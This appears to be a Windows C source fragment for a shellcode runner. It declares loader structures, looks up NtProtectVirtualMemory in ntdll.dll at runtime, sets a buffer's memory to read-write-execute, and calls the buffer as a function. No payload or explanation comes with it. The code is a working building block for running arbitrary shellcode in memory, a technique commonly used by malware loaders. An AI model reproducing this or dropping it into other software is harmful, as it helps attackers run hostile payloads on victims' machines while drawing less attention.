#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PVOID DefaultLanguage;
    PVOID LoadConfigurationInfo;
    ULONG CodeIntegrityInfo;
    ULONG CodeIntegrityPolicy;
    ULONG VolatileInformation;
    ULONG Reserved5;
    ULONG Reserved6;
    ULONG Reserved7;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
);

void Run_From_Memory(void *shellcode, int size) {
    SIZE_T regionSize = (SIZE_T)size;
    DWORD oldProtect;
    NTSTATUS status;

    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

    if (NtProtectVirtualMemory == NULL) {
        // Handle error: Could not find NtProtectVirtualMemory
        return;
    }

    status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &shellcode,
        &regionSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    );

    if (status != 0) {
        // Handle error: NtProtectVirtualMemory failed
        return;
    }

    typedef void (*ShellcodeFunc)();
    ShellcodeFunc func = (ShellcodeFunc)shellcode;
    func();

    // Restore original protection (optional, but good practice)
    NtProtectVirtualMemory(
        GetCurrentProcess(),
        &shellcode,
        &regionSize,
        oldProtect,
        &oldProtect
    );
}